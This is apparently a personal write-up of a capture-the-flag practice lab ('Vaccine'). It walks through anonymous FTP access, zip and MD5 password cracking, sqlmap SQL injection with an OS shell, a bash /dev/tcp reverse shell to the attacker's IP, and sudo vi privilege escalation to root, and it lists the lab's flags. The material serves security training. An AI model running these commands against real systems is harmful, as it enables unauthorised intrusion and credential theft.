
### **Starting Labs**

##### **Section 3:**
###### Vaccine:
		 --website enum--
run nmap to find open ports
``nmap -sC -sV {ip}``
we find three ports that are open, the only relative one we can use right now is the ftp port, it states that it accepts ``anonymous`` as a login.

```	    
		    ftp {ip}
			anonymous/{no pass}
```
After logging in we see what we are working with,  we run ls and thats when we find ``backup.zip `` so we export it to our device using ``get``, and go back to our device.
```
			get backup.zip
			quit
```

We get the file from the ftp port we start working on it, after opening it we are prompted to enter a password which we don't know. So we convert the zip file to a format that john can interact. we also use the rockyou wordlist that is zipped up so we also need to unzip that.
```
		
		 zip2john backup.zip > hashes

		 gzip -d rockyou.txt.gz

		 john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

We cracked the password so now we can see it using the following john command:

```
		john --show hashes
```

Note password was 741852963, it will be in the following format bellow.
			
back.zip:{passwd}:: {...}			
			
```
		unzip backup.zip 
			enter password$:741852963
			
```

Entering the password successfully unzips the files for us. So now we read one of the two files that is outputted to us from unzipping the file.

```
cat index.php
```

There is a section that specifies that a password has to be equal to something when its md5 encrypted.

```
md5(passwd)==="2cb42f8734ea607eefed3b70af13bbd3"
```

To verify this we take the use a website called "https://hashes.com/en/tools/hash_identifier" to determine the encryption used. or we can use the ``hashid`` command verify this for us.

```
		 hashid 2cb42f8734ea607eefed3b70af13bbd3
```
We take the Cipher text and input it to a file we call hash to decrypt using ``hashcat``. We use -a to signify attack mode and the 0 after it stands for Straight. we use -m 0 to specify the hash we are decrypting, 0 stands for MD5 according to ``hashcat``'s manual.
```
		 echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
		
		hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```
			
after decrypting it qwerty789 is our password. 
it is in the following format:
{cipher:plaintxt(password)}
ex: 
2cb42f8734ea607eefed3b70af13bbd3:qwerty789

now that we have the website password we can login through webpage using these credentials.

		user: admin
		password: qwerty789
		
---Establishing foothold via Dashboard search ---
		Search bar only useful thing. so we use sql map with our cookies which we got using inspect element.
		
Get sql map and find vulnerabilities:

```
		sqlmap -u 'http://{ip}/dashboard.php?search=' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7"
```
		
We found that the search bar is vulnerable so we add a os shell to our cmd
		
```
		sqlmap -u 'http://10.129.95.174/dashboard.php?search=any' --cookie="PHPSESSID=4t35be7jpviob87fi0crbl04o7" --os-shell
```

now we need to find our own  ip for the shell we are trying to use so we open a new bash terminal.
		
in a new terminal, we type ``hostname -I`` to get our ip:

```
HOSTNAME -I
```

We then start listening on a specific port using netcat:
-l: listening
-v: verbose
-n: ip 
-p: port

```
Sudo nc -lvnp 1234
```

Go back to our old terminal, and type the following command to connect a bash terminal that we are spawning to our nc port that we setup, this will act as a bash shell for us. 

**the shell is unstable and will randomly disconnect sometimes, that is normal. If it happens just repeat the steps until we find another method to gain control**

```
bash -c "bash -i >& /dev/tcp/{your_IP}/{port} 0>&1"
```
After establishing the shell, we enter the following:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

After looking through some directories we find user.txt file in '/var/lib/postgresql/'


			cat user.txt
		
		**>>ec9b13ca4d6229cd5cc1e09980965bf7**
		
that is our user flag which we will need to submit after we are done with the lab.

we continue digging and searching other directories, after going back a few directories we find the /var/www directory which has the website pages. 

we find a few files and after reading a few of them using ```cat ``` we find the following line in "dashboard.php"

```
try {
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
password=P@s5w0rd!");
}
```

We can see that the postgres password is listed as ``
```P@s5w0rd!```. So we can use this to login via ssh which will give us a more stable shell as opposed to using os-shell and spawning our own bash terminal. 

we can now connect via SSH 

```
ssh postgres@{ip}
```

and then enter the password ``` P@s5w0rd!``` .

after running ```sudo -l``` to get the permissions we have this is the output:

```
postgres@vaccine:/$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

the following line at the end of the output 
```  
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
signifies we have sudo access to run  
```
/bin/vi 
```
on 
```
/etc/postgresql/11/main/pg_hba.conf
```

so to check the file we run the command
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

after opening the vi file we can type in the following command to set the shell and then run it:
```
:Set shell=/bin/sh

:shell
```
since we ran the shell with sudo privileges we now have root access, we can verify this by typing ```
```
whoami
```
we should get "root" in the response.

![[VqKjp5f.png]]

after verifying we are root, we can look at the directory we are in and try to navigate the the root folder we saw earlier
```
cd root

ls 

cat root.txt
```
after reading the root file we get the root flag:
```
dd6e058e814260bc70e9bbdef2715849
```


Now we have the user and root flag:
User: ec9b13ca4d6229cd5cc1e09980965bf7
Root: dd6e058e814260bc70e9bbdef2715849

-------

###### Unified:

---website enum---
